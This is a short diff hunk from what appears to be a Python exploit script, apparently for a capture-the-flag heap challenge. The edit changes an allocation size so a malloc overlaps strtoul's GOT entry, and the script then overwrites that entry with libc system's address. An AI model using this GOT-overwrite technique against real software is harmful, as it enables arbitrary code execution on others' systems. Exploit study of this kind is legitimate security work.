@@ -159,7 +159,7 @@ if __name__ == '__main__':
     s('X')
 
     s('g')
-    s('0x8') # this malloc will overlap with strtoul@got
+    s('0x5') # this malloc will overlap with strtoul@got
     s(p32(LIBC_BASE+SYSTEM_OFFSET))  # overwrite, now strtoul == system
 
     s('g')
